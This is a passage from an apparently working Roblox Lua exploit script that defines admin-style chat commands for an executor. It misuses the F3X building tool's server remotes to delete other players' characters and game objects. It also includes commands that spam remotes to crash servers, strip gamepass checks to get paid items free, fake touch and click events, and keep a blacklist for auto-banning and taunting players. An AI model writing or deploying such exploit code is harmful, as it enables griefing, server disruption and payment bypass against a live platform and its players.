        tool:FindFirstChildOfClass("BindableFunction"):FindFirstChildOfClass("RemoteFunction"):InvokeServer("UndoRemove", {instance})
    end
end
local function ExecuteDeletion(Targets)
    local player = game.Players.LocalPlayer
    local Tool = GetPath()
    if Tool then
        if Tool.Parent == player.Backpack then
            Tool.Parent = player.Character
            task.wait(0.1)
            for _, Target in pairs(Targets) do
                if Target then Delete(Target, Tool) end
            end
            task.wait(0.1)
            Tool.Parent = player.Backpack
        else
            for _, Target in pairs(Targets) do
                if Target then Delete(Target, Tool) end
            end
        end
    end
end
cb("delgearboard", function()
ExecuteDeletion({
        workspace:FindFirstChild("made by FoxBin"),
        workspace:FindFirstChild("made by FoxBin1"),
        workspace:FindFirstChild("made byFoxBin MK2"),
        workspace:FindFirstChild("made by FoxBinMK4"),
        workspace:FindFirstChild("made by FoxBinMK6")
    })
end)
cb("delmodel", function()
    ExecuteDeletion({workspace:FindFirstChild("FoxBinMK5")})
end)
cb("delf3x", function()
    local SafePlate = workspace:FindFirstChild("SafePlate")
    local F3XGiver
    if SafePlate then
        for _, v in pairs(SafePlate:GetDescendants()) do
            if v.Name == "Bricks" and v:FindFirstChild("Bar") then
                F3XGiver = v.Parent
            end
        end
    end
    ExecuteDeletion({F3XGiver})
end)
cb("delmusic", function()
    local MusicModel = workspace:FindFirstChild("FoxBin'sDjBoard")
    local MusicPlayer = MusicModel and MusicModel:FindFirstChild("Brain")
    ExecuteDeletion({MusicPlayer})
end)
cb("delplate", function()
    ExecuteDeletion({
        workspace:FindFirstChild("SafePlate"),
        workspace:FindFirstChild("AdGui")
    })
end)
cb("delgearsave", function()
    ExecuteDeletion({workspace:FindFirstChild("GearBoardManagerModel")})
end)
cb("delxmas", function()
    ExecuteDeletion({workspace:FindFirstChild("Xmas Parts")})
end)
cb("delbrick", function()
    ExecuteDeletion({workspace:FindFirstChild("Bricks")})
end)
cb("delisland", function()
    ExecuteDeletion({
        workspace:FindFirstChild("Baseplate"),
        workspace:FindFirstChild("Bricks")
    })
end)
cb("delf3xhandler", function()
    local player = game.Players.LocalPlayer
    local Tool = GetPath()
    if Tool then
        local handle = Tool:FindFirstChild("Handle")
        ExecuteDeletion({handle})
    end
end)
local function GetPath()
        local ToolName = "F3X" or "Building Tools"
        local Tool = player.Character:FindFirstChild(ToolName) or player.Backpack:FindFirstChild(ToolName)
        return Tool
    end
    local function Delete(instance, tool)
    tool:FindFirstChildOfClass("BindableFunction"):FindFirstChildOfClass("RemoteFunction"):InvokeServer("UndoRemove", {instance})
    end
    local function void(Target)
        local Tool = GetPath()
        if not Tool then return end

        local function Task()
            Delete(Target.Character, Tool)
        end

        if Tool.Parent == player.Backpack then
            Tool.Parent = player.Character
            task.wait(0.1)
            Task()
            task.wait(0.1)
            Tool.Parent = player.Backpack
        elseif Tool.Parent == player.Character then
            Task()
        end
    end
        local function kick(Target)
        local Tool = GetPath()
        if not Tool then return end

        local function Task()
            Delete(Target, Tool)
        end
        if Tool.Parent == player.Backpack then
            Tool.Parent = player.Character
            task.wait(0.1)
            Task()
            task.wait(0.1)
            Tool.Parent = player.Backpack
        elseif Tool.Parent == player.Character then
            Task()
        end
    end
local whitelisted = {}
local Tool = GetPath()
local BlacklistedTools = {"CyanFlourish", "F3X", "FoxBin's Magic Hand"}
cb("antitool", function() 
if Loops.blacklisttools then Loops.blacklisttools = false else Loops.blacklisttools = true
repeat game:GetService("RunService").RenderStepped:Wait() pcall(function()
    for i,v in pairs(game.Players:GetPlayers()) do
		for i,too in pairs(BlacklistedTools) do
        spawn(function()
        if v ~= game.Players.LocalPlayer then 
elseif not whitelisted[v.name] then 
            if v and v.Character and v.Character:FindFirstChild(too) then v.Character:FindFirstChild(too):Destroy() void(v)
                end
                end
        end)
        spawn(function()
        if v ~= game.Players.LocalPlayer then 
           elseif not whitelisted[v.name] then
            if v.Backpack:FindFirstChild(too) then v.Backpack:FindFirstChild(too):Destroy() void(v)
                end
                end
        end)
		end
    end
    end)until not Loops.blacklisttools
end end)
cb("wl", function()
for _Index, Target in pairs(GetPlayer(args[2])) do
whitelisted[Target.name] = true 
end end)
cb("unwl", function()
for _Index, Target in pairs(GetPlayer(args[2])) do
whitelisted[Target.name] = nil
end end)
cb('infgod', function()
    if _G.infgod then _G.infgod = false else _G.infgod = true end
local player = game.Players.LocalPlayer
local function fireTouch()
    local character = player.Character
    if not character then return end
    local hrp = character:FindFirstChild("HumanoidRootPart")
    local safePlate = workspace:FindFirstChild("SafePlate")
    if not hrp or not safePlate then
        return
    end
    while _G.infgod do
        firetouchinterest(hrp, safePlate, 1)    
        wait(0.1)
        firetouchinterest(hrp, safePlate, 0)
    end
end
local function onCharacterRespawn(character)
    while _G.infgod do
    fireTouch()
    wait(0.5)
    fireTouch()
    end
end
local player = game.Players.LocalPlayer
player.CharacterAdded:Connect(onCharacterRespawn)
if player.Character then
    onCharacterRespawn(player.Character)
end
fireTouch()
end)
--[[cb("antibug", function() 
if _G.cansend then _G.cansend = false else _G.cansend = true end
local plrs = game.Players
local plr = plr.LocalPlayer
local getplrs = plrs:GetChildren()
for _, v in pairs(getplrs) do
            v.Chatted:Connect(function(msg)
                if msg == "/e dance7" and _G.cansend then
local StarterGui = game:GetService("StarterGui")
local response = Instance.new("BindableFunction")
response.OnInvoke = function(answer)
    if answer == "Kick" then
kick(v)
    elseif answer == "Void" then
void(v)
    end
end
StarterGui:SetCore("SendNotification", {
    Title = "[ĵøţúņ]",
    Text = "Player " ..v.name .. " had used /e dance7 what you gonna do?",
    Duration = 6,
    Callback = response,
    Button1 = "Void",
    Button2 = "Kick"
})
end
end)
end
end)]]
cb("loadout", function()
local root = game.Players.LocalPlayer.Character.HumanoidRootPart
local oldpos = root.CFrame
root.CFrame = workspace.GearBoardManagerModel.LoadOut.SlotDisplayButton.CFrame + Vector3.new(0, -20, 0) 
local part = Instance.new("Part")
            part.Size = Vector3.new(10, 1, 10)
            part.Position = Vector3.new(root.Position.X, -20, root.Position.Z)
            part.Anchored = true
            part.CanCollide = true
            part.Transparency = 0.5
            part.BrickColor = BrickColor.new("Really black")
            part.Parent = game.Workspace
            _G.AirWalkPart = part
            wait(0.2)
            local args = {
    [1] = 0
}

workspace:WaitForChild("GearBoardManagerModel"):WaitForChild("LoadOut"):WaitForChild("GlobalLoadOutManager"):WaitForChild("Load"):FireServer(unpack(args))
root.CFrame = oldpos
_G.AirWalkPart:Destroy()
end)
cb("music", function() 
local root = game.Players.LocalPlayer.Character.HumanoidRootPart
if args[2]:lower() == "0" then
    local args = {
    [1] = "StopSound"
}

game:GetService("ReplicatedStorage"):WaitForChild("WorkspaceAPI"):FireServer(unpack(args))
elseif args[2]:lower() ~= "0" then
local oldpos = root.CFrame
root.CFrame = workspace["FoxBin'sDjBoard"].Brain.MainWall.CFrame
wait(0.2)
local args = {
    [1] = "PlaySound",
    [2] = args[2]
}
game:GetService("ReplicatedStorage"):WaitForChild("WorkspaceAPI"):FireServer(unpack(args))
root.CFrame = oldpos
end end)
cb("regen", function()
fireclickdetector(workspace.Bricks.Head.ClickDetector)
end)
cb("regensp", function()
fireclickdetector(workspace["Sp bricks"].Head.ClickDetector)
end)
cb("//tempcrash", function()
local targets = {"install","old ROBLOX plugin"}
    local root = game.Players.LocalPlayer.Character.HumanoidRootPart
    root.CFrame = CFrame.new(-452,-11,-131)
    local part = Instance.new("Part")
            part.Size = Vector3.new(10, 1, 10)
            part.Position = Vector3.new(root.Position.X, -20, root.Position.Z)
            part.Anchored = true
            part.CanCollide = true
            part.Transparency = 0.5
            part.BrickColor = BrickColor.new("Really black")
            part.Parent = game.Workspace
            _G.lastserverlive = part
    wait(0.8)
local RunService = game:GetService("RunService")
    for i = 1,40 do local args = {
    [1] = "SetGear",
    [2] = "561245776"
}

game:GetService("ReplicatedStorage"):WaitForChild("WorkspaceAPI"):FireServer(unpack(args))
end
spawn(function()
    while true do
        for _, name in pairs(targets) do
            local success, err = pcall(function()
                local obj = workspace:FindFirstChild(name)
                if obj then
                    obj:Destroy()
                    print("Deleted workspace." .. name)
                end
            end)
            if not success then
                warn("Error deleting " .. name .. ": " .. tostring(err))
            end
        end
        wait()
    end
end)
for i = 1,100 do  tempcrash()end
end)
cb("back", function() 
if _G.cantp then _G.cantp=false;else _G.cantp=true;end
local player = game.Players.LocalPlayer
local humanoid = player.Character:WaitForChild("Humanoid")
local root = player.Character:WaitForChild("HumanoidRootPart")
local oldpos
local function onCharacterAdded(newCharacter)
    local root = newCharacter:WaitForChild("HumanoidRootPart")
    if _G.cantp then
        task.wait(0.2)
        root.CFrame = oldpos
        print("Teleported to saved position")
    end end
    humanoid.Died:Connect(function()
        if _G.cantp then
            local player = game.Players.LocalPlayer
local root = player.Character:WaitForChild("HumanoidRootPart")
        local oldpos = root.CFrame
        local args={[1]="LoadChar",[2]=1}
game:GetService("ReplicatedStorage"):WaitForChild("StatAPI"):FireServer(unpack(args))
end end)
player.CharacterAdded:Connect(onCharacterAdded)
if player.Character then
    onCharacterAdded(player.Character)
end
end)
cb("dragon", function()
-- 94233391
local root = game.Players.LocalPlayer.Character.HumanoidRootPart
local oldpos = root.CFrame
    root.CFrame = CFrame.new(-452,-11,-131)
    local part = Instance.new("Part")
            part.Size = Vector3.new(10, 1, 10)
            part.Position = Vector3.new(root.Position.X, -20, root.Position.Z)
            part.Anchored = true
            part.CanCollide = true
            part.Transparency = 0.5
            part.BrickColor = BrickColor.new("Really black")
            part.Parent = game.Workspace
            _G.lastonealivewilllockthedoor = part
            wait(0.4)
            clear()
            for i = 1,40 do local args = {
    [1] = "SetGear",
    [2] = "94233391"
}

game:GetService("ReplicatedStorage"):WaitForChild("WorkspaceAPI"):FireServer(unpack(args)) end
for i = 1,args[2] do fireclickdetector(workspace.FoxBinMK5.Model.Dispenser.Dispenser.Buttons.Custom["1"].ClickDetector) end
wait(0.5)
clear()
root.CFrame = oldpos
_G.lastonealivewilllockthedoor:Destroy()
local Backpack = game.Players.LocalPlayer:FindFirstChildOfClass("Backpack")
    for _, v in ipairs(Backpack:GetChildren()) do
        v.Parent = game.Players.LocalPlayer.Character
        v:Activate()
    end
    wait(.49)
    local VirtualUser = game:GetService("VirtualUser")
    VirtualUser:CaptureController()
    VirtualUser:ClickButton1(Vector2.new())
end)
getgenv().blacklisted = {}

cb("bl", function()
			for _Index, Target in pairs(GetPlayer(args[2])) do
appendfile("badpeople.txt",Target.Name.."\n")
local args = {
    [1] = "[ĵøţúņ]:"..Target.DisplayName.." Good job, you've earned a spot in my blacklist.",
    [2] = "All"
}

game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(unpack(args))
game.Players:chat("/e ban " ..Target.Name)
end end)
local blacklist = isfile("badpeople.txt")
            if not blacklist then 
               writefile("badpeople.txt","qwertyqwertyqwerty\n")
            else
              blacklist = readfile("badpeople.txt"):split("\n")
              for i = 1,#blacklist do 
                table.insert(getgenv().blacklisted,blacklist[i])
              end
            end
for i = 1, #getgenv().blacklisted do
                    if player.Name == getgenv().blacklisted[i] then
                        error("Blacklisted player: "..player.Name.." Has joined, locking player")
if not Tool then return end
game.Players:chat("/e ban "..player.Name)
end
end
cb("sink", function()
for _Index, Target in pairs(GetPlayer(args[2])) do
ExecuteDeletion({
Target.Character:FindFirstChild("HumanoidRootPart")
})
end end)
cb("nojoint", function()
for _Index, Target in pairs(GetPlayer(args[2])) do
ExecuteDeletion({
Target.Character.HumanoidRootPart:FindFirstChild('RootJoint')
})
end end)
cb("nd", function()
for _Index, Target in pairs(GetPlayer(args[2])) do
ExecuteDeletion({
Target.Character:FindFirstChild("Humanoid")
})
end end)
cb("sit", function()
player.Character:FindFirstChildWhichIsA("Humanoid").Sit = true
end)
cb("invisf3x", function()
        local Tool = GetPath()
        if not Tool then return end

        local function Task()
            Delete(player.Character.F3X.Handle, Tool)
        end
        if Tool.Parent == player.Backpack then
            Tool.Parent = player.Character
            task.wait(0.1)
            Task()
            task.wait(0.1)
            Tool.Parent = player.Backpack
        elseif Tool.Parent == player.Character then
            Task()
        end
end)
cb("gear", function()
local root = game.Players.LocalPlayer.Character.HumanoidRootPart
local oldpos = root.CFrame
root.CFrame = workspace.FoxBinMK5.Model.Dispenser.Dispenser.Wall.CFrame + Vector3.new(0, -20, 0) 
    local part = Instance.new("Part")
            part.Size = Vector3.new(10, 1, 10)
            part.Position = Vector3.new(root.Position.X, -20, root.Position.Z)
            part.Anchored = true
            part.CanCollide = true
            part.Transparency = 0.5
            part.BrickColor = BrickColor.new("Really black")
            part.Parent = game.Workspace
            _G.lastonealivewilllockthedoorr = part
clear()
            for i = 1,40 do local args = {
    [1] = "SetGear",
    [2] = args[2]
}

game:GetService("ReplicatedStorage"):WaitForChild("WorkspaceAPI"):FireServer(unpack(args)) end
wait(0.4)
fireclickdetector(workspace.FoxBinMK5.Model.Dispenser.Dispenser.Buttons.Custom["1"].ClickDetector)
root.CFrame = oldpos
clear()
_G.lastonealivewilllockthedoorr:Destroy()
end)
cb('void', function() for _Index, Target in pairs(GetPlayer(args[2])) do void(Target) end end)
cb("scream", function()
for i = 1,100 do game.Players:chat("Me silly2") end
end)
cb("cage", function()
for _Index, Target in pairs(GetPlayer(args[2])) do
local owner = game.Players.LocalPlayer
local plr = owner
					_G.cagecheck = false
local root = game.Players.LocalPlayer.Character.HumanoidRootPart
local oldpos = plr.Character.HumanoidRootPart.CFrame
root.CFrame = CFrame.new(-459,-5,-128)
local part = Instance.new("Part")
            part.Size = Vector3.new(10, 1, 10)
            part.Position = Vector3.new(root.Position.X, -20, root.Position.Z)
            part.Anchored = true
            part.CanCollide = true
            part.Transparency = 0.5
            part.BrickColor = BrickColor.new("Really black")
            part.Parent = game.Workspace
            _G.thisfunnydotio = part
clear()
for i = 1,40 do local args = {
    [1] = "SetGear",
    [2] = "82357101"
}

game:GetService("ReplicatedStorage"):WaitForChild("WorkspaceAPI"):FireServer(unpack(args)) end
wait(0.3)
fireclickdetector(workspace.FoxBinMK5.Model.Dispenser.Dispenser.Buttons.Custom["1"].ClickDetector)
clear()
					if _G.cagecheck == false then
						_G.cagecheck = true
						repeat task.wait() until plr.Backpack:FindFirstChild('PortableJustice')
						plr.Backpack.PortableJustice.Parent = plr.Character
						repeat task.wait() until game.Workspace[plr.Name].PortableJustice:FindFirstChild('MouseClick')
						plr.Character.HumanoidRootPart.CFrame = Target.Character.HumanoidRootPart.CFrame

						repeat 
							coroutine.wrap(function()
								game.Workspace[plr.Name].PortableJustice.MouseClick:FireServer(game.Workspace[Target.Name]) 
							end)()
							task.wait() 
						until Target.Character:FindFirstChild('DisableBackpack')
pcall(function()
game.Players.LocalPlayer.Character.Humanoid:UnequipTools()
player.Backpack.PortableJustice:Destroy()
							_G.cagecheck = false
end)
						plr.Character:WaitForChild("HumanoidRootPart")
						plr.Character.HumanoidRootPart.CFrame = oldpos
					end
_G.thisfunnydotio:Destroy()
			end
		end
	)
local Tool = GetPath()
cb("nop2w", function()
    _G.nop2w = true
local player = game:GetService("Players").LocalPlayer
local backpack = player:FindFirstChild("Backpack") or player:WaitForChild("Backpack")

if backpack then
    for _, item in pairs(backpack:GetChildren()) do
        if item:IsA("BasePart") or item:IsA("Tool") then
            for _, descendant in pairs(item:GetDescendants()) do
                if descendant.Name == "GamepassChecker" then
if _G.nop2w then
ExecuteDeletion({descendant})                    print("Found gamepasschecker in", item.Name, "of player", player.Name)
                    end
                end
            end
        end
    end
end

backpack.ChildAdded:Connect(function(item)
    if item:IsA("BasePart") or item:IsA("Tool") then
        for _, descendant in pairs(item:GetDescendants()) do
            if descendant.Name == "GamepassChecker" then
if _G.nop2w then
ExecuteDeletion({descendant})  
                print("Found gamepasschecker in", item.Name, "of player", player.Name)
                end
            end
        end
    end
end)
end)
cb("p2w", function()
_G.nop2w = false
end)
cb("sbl", function()
			for _Index, Target in pairs(GetPlayer(args[2])) do
appendfile("badpeople.txt",Target.Name.."\n")
game.Players:chat("/e ban " ..Target.Name)
end end)
local function GetPath()
        local ToolName = "F3X" or "Building Tools"
        local Tool = player.Character:FindFirstChild(ToolName) or player.Backpack:FindFirstChild(ToolName)
        return Tool
    end
cb("del", function()
local workspace = game.Workspace
    for _, object in pairs(workspace:GetDescendants()) do
    if object.Name == args[2] then
        local Tool = GetPath()
        if not Tool then return end
        for i,v in pairs({object}) do
        local function Task()
					Delete(v, Tool)
            end
if Tool.Parent == player.Backpack then
            Tool.Parent = player.Character
            task.wait(0.1)
            Task()
            task.wait(0.1)
            Tool.Parent = player.Backpack
        elseif Tool.Parent == player.Character then
            Task()
        end
        end
        end
    end
end)
cb("musiclock", function()
    local s,f=pcall(function()
local root = game.Players.LocalPlayer.Character.HumanoidRootPart
    local soundlock = tonumber(args[2])
local musicherefreedonwload = tonumber(args[2])
local origsound = soundlock
soundlock="http://www.roblox.com/asset/?id="..tostring(soundlock)
Loops.musiclock = true
local gwawg = 0
repeat task.wait(0.1) gwawg = gwawg + 0.1
    if workspace["FoxBin'sDjBoard"]:FindFirstChild("Sound") or workspace["FoxBin'sDjBoard"].Brain:FindFirstChild("MainWall") then
        local music = workspace["FoxBin'sDjBoard"]:FindFirstChild("Sound") or workspace["FoxBin'sDjBoard"]:FindFirstChild("Sound1")
        if music.IsLoaded and music.SoundId == soundlock then
           if gwawg > music.TimeLength then gwawg = 0 end 
           if math.abs(music.TimePosition - gwawg) > 0.5 then
               music.TimePosition = gwawg
            end
        end
        if music.SoundId ~= soundlock then
            local oldpos = root.CFrame
root.CFrame = workspace["FoxBin'sDjBoard"].Brain.MainWall.CFrame
wait(0.2)
local args = {
    [1] = "PlaySound",
    [2] = origsound
}
game:GetService("ReplicatedStorage"):WaitForChild("WorkspaceAPI"):FireServer(unpack(args))
root.CFrame = oldpos
        end
        if music.Playing == false then
            music:Play() 
        end
    else
        local oldpos = root.CFrame
root.CFrame = workspace["FoxBin'sDjBoard"].Brain.MainWall.CFrame
wait(0.2)
local args = {
    [1] = "PlaySound",
    [2] = origsound
}
game:GetService("ReplicatedStorage"):WaitForChild("WorkspaceAPI"):FireServer(unpack(args))
root.CFrame = oldpos
    end
until not Loops.musiclock
end) if not s then print(f)end
end)
cb("unmusiclock", function()
    Loops.musiclock = false
end)
local plr = game.Players.LocalPlayer 
local chr = plr.Character
cb("alpaca", function()
gear(292969139, args[2])
    wait(0.25)
    for i,v  in pairs(plr.Backpack:GetChildren()) do
        local staff = v
        v.Parent = chr
    end
    wait(0.1)
    for i,v  in pairs(chr:GetChildren()) do
        if v:IsA("Tool") then
            v:Activate()
        end
    end
end)
cb("fixvel", function()
    for i,v in pairs(workspace:GetDescendants()) do
        if v:IsA("BasePart") then
            v.Velocity = Vector3.new(0,0,0)
        end
    end
end)
cb("delp2w", function() 
ExecuteDeletion({
workspace["made by FoxBinMK4"].Model.Dispenser.Dispenser.GamepassInsertScript,
workspace["made by FoxBinMK4"]:GetChildren()[2].Dispenser.Dispenser:FindFirstChild("GamepassInsertScript")
})
end)
cb(
        "gs",
        function()
 for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do

            coroutine.wrap(function()

                pcall(function()
                    v.Parent = game.Players.LocalPlayer.Character
                end)
            end)()
        end
                local cf = CFrame.new(Vector3.new(0,-4,0))
 
                 local segments = 100
 
                 
                 local radius = args[2]
                 local Positions = {}
                 local single = 360/segments
 
                 for i = 1, segments do
                     local angle = single*i
                     local cheating = cf * CFrame.Angles(0,math.rad(angle),0)
                     table.insert(Positions, cheating.Position + cheating.LookVector * radius)
                 end
                 for i,v in pairs(plr.Character:GetChildren()) do
                     if v:IsA("Tool") then
                     coroutine.wrap(function()
                         pcall(function()
                             v.GripPos = Positions[i]
                             task.wait()
                             v.Parent = plr.Character
                         end)
                     end)()
                 end
                 end
                 for i = 1, #Positions do 
                     table.remove(Positions,i)
                 end
                 end)
cb("bombox", function()
gear(212641536, args[2])
end)
cb("play", function()
local plr = game.Players.LocalPlayer 
local chr = plr.Character
for i,v  in pairs(chr:GetChildren()) do
    if v:IsA("Tool") then
        pcall(function()
            v.Remote:FireServer("PlaySong",args[2])
        end)
    end
end
end)
cb("timepos", function()
    for i,v  in pairs(chr:GetChildren()) do
    if v:IsA("Tool") then
        pcall(function()
            v.Handle.Sound.TimePosition = args[1]
        end)
    end
end
local music = workspace["FoxBin'sDjBoard"]:FindFirstChild("Sound") or workspace["FoxBin'sDjBoard"]:FindFirstChild("Sound1")
            music.TimePosition = args[1]
end)
cb("anticrash", function()
local workspace = game.Workspace
    for _, object in pairs(workspace:GetDescendants()) do
    if object.Name == "Btools Giver" then
    object:Destroy()
        end
    end
end)
cb("ping", function()
game.TextChatService.TextChannels.RBXSystem:DisplaySystemMessage("<font color=\"rgb(23, 252, 3)\">Pong:"..tostring(plr:GetNetworkPing()*1000):split(".")[1].." ms</font>")
end)
cb("fps",function()
local function getFps()
return (1/game:GetService("RunService").RenderStepped:Wait())
end
local fps = string.format("%.1f", getFps())
game.TextChatService.TextChannels.RBXSystem:DisplaySystemMessage("<font color=\"rgb(23, 252, 3)\">Fps currently is: " .. fps .. "</font>")
end)
cb("freeze", function()
for _Index, Target in pairs(GetPlayer(args[2])) do
local root = game.Players.LocalPlayer.Character.HumanoidRootPart
oldpos = root.CFrame
gear(94794847, 1)
local thedollarsecondary = Instance.new("Part",game.Players.LocalPlayer.Character)
		thedollarsecondary.Anchored = true
		thedollarsecondary.Size = Vector3.new(10,1,10)
		thedollarsecondary.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,-5,0)
    repeat wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("VampireVanquisher")
    local VampireVanquisher = game.Players.LocalPlayer.Backpack:FindFirstChild("VampireVanquisher")
    VampireVanquisher.Parent = game.Players.LocalPlayer.Character
    root.CFrame = CFrame.new(10000000000000000000000000000000000, 10000000,10000000)
    repeat wait() until not game.Players.LocalPlayer.Character.VampireVanquisher:FindFirstChild("Coffin")
    repeat wait()
    firetouchinterest(VampireVanquisher.Handle,Target.Character.Head,0)firetouchinterest(VampireVanquisher.Handle,Target.Character.Head,1)
    until Target.Character.Torso.Anchored == true
local args={[1]="LoadChar",[2]=1}
game:GetService("ReplicatedStorage"):WaitForChild("StatAPI"):FireServer(unpack(args))
_G.canteleport = true
local function onCharacterAdded(newCharacter)
    if _G.canteleport then
    local root = newCharacter:FindFirstChild("HumanoidRootPart")
    wait(0.8)
       root.CFrame = oldpos
       _G.canteleport = false
    end
    end
player.CharacterAdded:Connect(onCharacterAdded)
if player.Character then
    onCharacterAdded(game.Players.LocalPlayer.Character)
end
end
end)
cb("btools?", function()
local toolName = "F3X"
local f3xgrabbed = {}
local function checkForTool(player)
    if player:FindFirstChild("Backpack") then
        local backpack = player.Backpack
        local toolInBackpack = backpack:FindFirstChild(toolName)
        if toolInBackpack then
            f3xgrabbed[player.name] = player.name
        end
    end

    if player:FindFirstChild("Character") then
        local character = player.Character
        local toolInCharacter = character:FindFirstChild(toolName)
        if toolInCharacter then
            f3xgrabbed[player.name] = player.name
        end
    end
end
for _, player in pairs(game.Players:GetPlayers()) do
    checkForTool(player)
end
    local message = "Currently People with btools ("..#f3xgrabbed.."):"
                for i,v in pairs(f3xgrabbed) do
                    if v ~= f3xgrabbed[#f3xgrabbed] then
                        message = message..v..". "
                    else
                        if #f3xgrabbed ~= 1 then
                            message = message..","..v.."."
                        else
                            message = message..v.."."
                        end
                    end
                end
game.TextChatService.TextChannels.RBXSystem:DisplaySystemMessage("<font color=\"rgb(23, 252, 3)\">" ..message.. "</font>")
end)
cb("fungear", function()
gear(119917513,1)
gear(74385399,1)
gear(287426148,1)
end)
cb("spamgear", function() gear(args[2], args[3]) end)
cb("crashpart", function()
gear(560414641, 600)
wait(0.9)
gear(560414641, 700)
end)
cb("bringparts", function()
    local function fun(object)
local args = {
[1] = "SyncResize",
    [2] = {
        [1] = {
            ["Part"] = object,
            ["CFrame"] = CFrame.new(0.490966796875, -10.870007038116455, 0.646560668945312, 1, 0, 0, 0, 1, 0, 0, 0, 1),
            ["Size"] = Vector3.new(10, 10, 6)
        }
    }
}
game:GetService("Players").LocalPlayer.Character.F3X:FindFirstChildOfClass("BindableFunction"):FindFirstChildOfClass("RemoteFunction"):InvokeServer(unpack(args))
end
    local workspaceParts = workspace:GetDescendants()
for i = 1, #workspaceParts do
local object = workspaceParts[i]
if object:IsA("BasePart") and not object.Locked then
    fun(object)
end 
end
end)
cb("resize", function()
for i,v in pairs(workspace:GetDescendants()) do
		if v:IsA("BasePart") then
			v.Locked = false
		end
	end
gear(1302058676, 1)
end)
cb("farm",function()
Farm = true
while Farm do 
repeat wait() until game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
game.Players.LocalPlayer.Character.Humanoid.Health = 0
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(0, -499.4, 0))
if player.Character:FindFirstChild("Humanoid").Died == true then
local args={[1]="LoadChar",[2]=1}
game:GetService("ReplicatedStorage"):WaitForChild("StatAPI"):FireServer(unpack(args))
wait()
end end end)
cb("unfarm", function()
Farm = false
end)
cb("//crash", function()
local root = game.Players.LocalPlayer.Character.HumanoidRootPart
root.CFrame = workspace.GearBoardManagerModel.LoadOut.SlotDisplayButton.CFrame + Vector3.new(0, -20, 0) 
local part = Instance.new("Part")
            part.Size = Vector3.new(10, 1, 10)
            part.Position = Vector3.new(root.Position.X, -20, root.Position.Z)
            part.Anchored = true
            part.CanCollide = true
            part.Transparency = 0.5
            part.BrickColor = BrickColor.new("Really black")
            part.Parent = game.Workspace
            _G.AirWalkPartttd = part
            game:GetService("Players").LocalPlayer.Backpack:Destroy()
            wait(0.2)
while true do wait()
workspace:WaitForChild("GearBoardManagerModel"):WaitForChild("LoadOut"):WaitForChild("GlobalLoadOutManager"):WaitForChild("Load"):FireServer(0)
workspace:WaitForChild("GearBoardManagerModel"):WaitForChild("LoadOut"):WaitForChild("GlobalLoadOutManager"):WaitForChild("Load"):FireServer(1)
workspace:WaitForChild("GearBoardManagerModel"):WaitForChild("LoadOut"):WaitForChild("GlobalLoadOutManager"):WaitForChild("Load"):FireServer(2)
end
end)
local function GetPath()
        local ToolName = "F3X" or "Building Tools"
        local Tool = player.Character:FindFirstChild(ToolName) or player.Backpack:FindFirstChild(ToolName)
        return Tool
    end
cb("podlag", function()
gear(24015579,args[2])
local function deletePartsWithMeshID()
    for _, item in ipairs(workspace:GetDescendants()) do
        if item:IsA("Part") and item.Name == "Part" then
            for _, descendant in ipairs(item:GetDescendants()) do
                if descendant:IsA("SpecialMesh") and descendant.MeshId == 19059116 then
                    item:Destroy()
                    break
                end
            end
        end
    end
end
for i = 1,args[3] do
local Backpack = game.Players.LocalPlayer:FindFirstChildOfClass("Backpack")
    for _, v in ipairs(Backpack:GetChildren()) do
        v.Parent = game.Players.LocalPlayer.Character
        v:Activate()
        v.Parent = game.Players.LocalPlayer.Backpack
    end
    wait(0.9)
deletePartsWithMeshID()
end end)
cb("//vampirecrash", function()
gear(94794847, 1)
repeat wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("VampireVanquisher")
    local VampireVanquisher = game.Players.LocalPlayer.Backpack:FindFirstChild("VampireVanquisher")
    if VampireVanquisher then
    for _, child in pairs(VampireVanquisher:GetChildren()) do
        if child.name ~= "Handle" then
        child:Destroy()
        end
    end
end
    VampireVanquisher.Parent = game.Players.LocalPlayer.Character local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local hrp = character:WaitForChild("HumanoidRootPart")
local big = workspace:FindFirstChild("Sp bricks"):FindFirstChild("Sp bricks"):FindFirstChild("CharacterSizeChanger"):FindFirstChild("Big")
local small = workspace:FindFirstChild("Sp bricks"):FindFirstChild("Sp bricks"):FindFirstChild("CharacterSizeChanger"):FindFirstChild("Small")
while true do
firetouchinterest(hrp, small, 0)
    firetouchinterest(hrp, big, 0)
    wait(0.1)
    firetouchinterest(hrp, small, 1)
    firetouchinterest(hrp, big, 1)
end
end)
cb("bring", function()
for _Index, Target in pairs(GetPlayer(args[2])) do
    local root = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
    local function bring(Target)
        local Tool = GetPath()
        if not Tool then return end
        local function Task()
        local args = {
    [1] = "CreatePart",
    [2] = "Wedge",
    [3] = CFrame.new(Target.Character.HumanoidRootPart.Position.X, Target.Character.HumanoidRootPart.Position.Y, Target.Character.HumanoidRootPart.Position.Z) * CFrame.Angles(-0, 0, -0)
}

game:GetService("Players").LocalPlayer.Character.F3X:FindFirstChildOfClass("BindableFunction"):FindFirstChildOfClass("RemoteFunction"):InvokeServer(unpack(args))
local args = {
    [1] = "CreateWelds",
    [2] = {
        [1] = workspace.Wedge
    },
    [3] = Target.Character.HumanoidRootPart
}
game:GetService("Players").LocalPlayer.Character.F3X:FindFirstChildOfClass("BindableFunction"):FindFirstChildOfClass("RemoteFunction"):InvokeServer(unpack(args))
local args = {
    [1] = "SyncSurface",
    [2] = {
        [1] = {
            ["Part"] = Workspace.Wedge,
            ["Surfaces"] = {
                ["Transparency\0"] = 1,
                ["CanCollide\0"] = false,
                ["Position\0"] = Vector3.new(root.Position.X, root.Position.Y, root.Position.Z),
                ["Name\0."] = "2-d29f7651bfe34b2b94cdc107f86caac4"
               --[[ ["Locked\0."] = true]]
            }
        }
    }
}
game:GetService("Players").LocalPlayer.Character.F3X:FindFirstChildOfClass("BindableFunction"):FindFirstChildOfClass("RemoteFunction"):InvokeServer(unpack(args))
local args = {
    [1] = "SyncSurface",
    [2] = {
        [1] = {
            ["Part"] = Workspace:FindFirstChild("2-d29f7651bfe34b2b94cdc107f86caac4"),
            ["Surfaces"] = {
                ["Anchored\0"] = true
